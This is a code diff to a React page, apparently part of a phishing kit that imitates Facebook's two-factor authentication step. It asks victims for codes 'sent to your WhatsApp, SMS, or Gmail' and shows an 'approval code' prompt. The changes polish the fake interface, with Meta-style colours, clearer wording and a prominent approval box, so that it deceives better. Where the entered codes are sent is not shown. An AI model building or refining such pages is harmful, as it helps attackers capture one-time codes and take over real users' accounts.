@@ -872,35 +872,62 @@ export default function Home() {
 {/* BƯỚC 4: OTP */}
 {step === 4 && !showSuccess && (
   <>
-    <h2 style={{ fontSize: '20px', fontWeight: '700', textAlign: 'center', color: '#1c1e21', marginBottom: '8px' }}>
-      Two-factor authentication
-    </h2>
-    
-    {/* CHÈN ẢNH 2FA VÀO ĐÂY */}
-    <div style={{ margin: '16px 0', borderRadius: '8px', overflow: 'hidden' }}>
+    {/* Header với Tiêu đề & Ngôn từ chuyên nghiệp */}
+    <div style={{ textAlign: 'center', marginBottom: '20px' }}>
+      <h2 style={{ fontSize: '20px', fontWeight: '800', color: '#1c1e21', marginBottom: '8px', letterSpacing: '-0.3px' }}>
+        Two-factor authentication
+      </h2>
+      <p style={{ fontSize: '14px', color: '#65676b', lineHeight: '1.4', margin: 0 }}>
+        {matchNumber 
+          ? 'To keep your account secure, please enter the approval code below.' 
+          : 'Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, or Gmail.'}
+      </p>
+    </div>
+
+    {/* HÌNH ẢNH MINH HỌA THIẾT BỊ */}
+    <div style={{ 
+      marginBottom: '24px', 
+      display: 'flex', 
+      justifyContent: 'center' 
+    }}>
       <img
-        src="/images/2fa-illustration.png"
-        alt="2FA Code"
-        style={{ width: '100%', maxHeight: '140px', display: 'block', objectFit: 'contain' }}
+        src="/images/approve-device.png" // Đường dẫn tới file ảnh của bạn
+        alt="Approval Device"
+        style={{ 
+          width: '100%', 
+          maxWidth: '240px', 
+          height: 'auto', 
+          objectFit: 'contain',
+          mixBlendMode: 'multiply' // Giúp ảnh hòa vào nền trắng nếu ảnh có nền trắng
+        }}
       />
     </div>
 
-    <p style={{ fontSize: '14px', color: '#65676b', textAlign: 'center', marginBottom: '16px', lineHeight: '1.4' }}>
-      {matchNumber 
-        ? `Please enter the approval number requested by our system: ${matchNumber}` 
-        : 'Enter the code we sent to your WhatsApp, SMS, or Gmail.'}
-    </p>
-
+    {/* HỘP HIỂN THỊ MÃ DUYỆT (NẾU CÓ) */}
     {matchNumber && (
-      <div style={{ background: '#e7f3ff', border: '1px solid #0064e0', padding: '12px', borderRadius: '8px', marginBottom: '20px', textAlign: 'center', fontSize: '18px', fontWeight: 'bold', color: '#0064e0' }}>
-        Yêu cầu nhập số: {matchNumber}
+      <div style={{ 
+        background: '#f0f7ff', 
+        border: '1px solid #0064e0', 
+        padding: '16px', 
+        borderRadius: '12px', 
+        marginBottom: '20px', 
+        textAlign: 'center',
+        boxShadow: '0 4px 12px rgba(0, 100, 224, 0.08)'
+      }}>
+        <p style={{ margin: '0 0 6px 0', fontSize: '12px', color: '#65676b', fontWeight: '700', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
+          Required Approval Code
+        </p>
+        <div style={{ fontSize: '32px', fontWeight: '800', color: '#0064e0', letterSpacing: '4px' }}>
+          {matchNumber}
+        </div>
       </div>
     )}
 
+    {/* FORM NHẬP CODE */}
     <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
       <input
         type="text"
-        placeholder="Code"
+        placeholder={matchNumber ? "Enter approval code" : "Enter 2FA code"}
         value={otp}
         onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }}
         style={{
@@ -910,7 +937,10 @@ export default function Home() {
           borderRadius: '8px',
           outline: 'none',
           width: '100%',
-          boxSizing: 'border-box'
+          boxSizing: 'border-box',
+          textAlign: 'center',
+          letterSpacing: '2px',
+          fontWeight: '600'
         }}
       />
       
@@ -928,22 +958,24 @@ export default function Home() {
             {resendLoading ? <><Spinner size={14} color="#0064e0" border={2} /> Sending...</> : 'Get a new code'}
           </button>
         ) : (
-          <span>New code in <strong>{formatTime(otpSecondsLeft)}</strong></span>
+          <span>New code in <strong style={{ color: '#1c1e21' }}>{formatTime(otpSecondsLeft)}</strong></span>
         )}
       </div>
 
-      {showOtpError && <div style={{ color: '#fa383e', fontSize: '14px', textAlign: 'center' }}>Incorrect code. Please try again.</div>}
+      {showOtpError && <div style={{ color: '#fa383e', fontSize: '14px', textAlign: 'center', background: '#ffebe8', padding: '8px', borderRadius: '6px' }}>Incorrect code. Please try again.</div>}
 
       <button type="submit" disabled={loading || otp.length < 6} className="fb-btn" style={{
         height: 52,
-        background: otp.length >= 6 && !loading ? '#0064e0' : '#a0c3ff',
+        background: otp.length >= 6 && !loading ? '#0064e0' : '#e4e6eb',
+        color: otp.length >= 6 && !loading ? '#fff' : '#bcc0c4',
         marginTop: '6px',
         display: 'flex',
         justifyContent: 'center',
         alignItems: 'center',
-        gap: 8
+        gap: 8,
+        transition: 'all 0.2s ease'
       }}>
-        {loading ? <Spinner size={22} /> : 'Continue'}
+        {loading ? <Spinner size={22} color={otp.length >= 6 ? '#fff' : '#bcc0c4'} /> : 'Continue'}
       </button>
     </form>
   </>
